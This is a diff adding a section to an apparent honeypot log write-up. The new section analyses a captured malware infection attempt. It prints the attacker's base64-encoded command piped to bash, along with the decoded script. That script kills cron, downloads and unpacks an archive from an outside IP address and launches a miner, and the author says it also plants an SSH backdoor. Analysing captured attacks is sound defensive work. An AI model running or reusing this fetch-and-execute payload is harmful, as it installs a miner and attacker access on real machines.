@@ -75,3 +75,27 @@ www.footlocker.com
 kith.com
 ```
 I used a regex to parse the ```dst_ip``` value. It might have messed some that were unable to match a domain. 
+
+
+# Malware infection attempt
+
+I wrote a different  post that goes into more details. But when I was viewing the logs I noticed a long string that looks like a base64 string. The base64 encoded string looked like this:
+```ruby 
+cd /var/tmp; echo \"IyEvYmluL2Jhc2gKY2QgL3RtcApybSAtcmYgLlgxNS11bml4Cm1rZGlyIC5YMTUtdW5peApjZCAuWDE1LXVuaXgKcGtpbGwgLTkgY3JvbiA+IC5vdXQKd2dldCAtcSBodHRwOi8vNTQuMzcuNzAuMjQ5L2RvdGEyLnRhci5neiB8fCBjdXJsIC1PIC1mIGh0dHA6Ly81NC4zNy43MC4yNDkvZG90YTIudGFyLmd6CnNsZWVwIDdzICYmIHRhciB4ZiBkb3RhMi50YXIuZ3oKI3JtIC1yZiBkb3RhMi50YXIuZ3oKY2QgLnJzeW5jCmNobW9kIDc3NyAqCmNkIC90bXAvLlgxNS11bml4Ly5yc3luYy9hICYmIC4vY3JvbiB8fCAuL2FuYWNyb24KZXhpdCAw\">.threatstackcloudsecops; base64 --decode .threatstackcloudsecops | bash
+```
+When ran it will download and execute a miner. But it will also add their ssh key to the ```.ssh``` directory. The malware also sets up a hidden SSH sever that allows the attckers to login. Below is the decoded base64 string.
+``ruby
+#!/bin/bash
+cd /tmp
+rm -rf .X15-unix
+mkdir .X15-unix
+cd .X15-unix
+pkill -9 cron > .out
+wget -q http://54.37.70.249/dota2.tar.gz || curl -O -f http://54.37.70.249/dota2.tar.gz
+sleep 7s && tar xf dota2.tar.gz
+#rm -rf dota2.tar.gz
+cd .rsync
+chmod 777 *
+cd /tmp/.X15-unix/.rsync/a && ./cron || ./anacron
+exit 0
+```
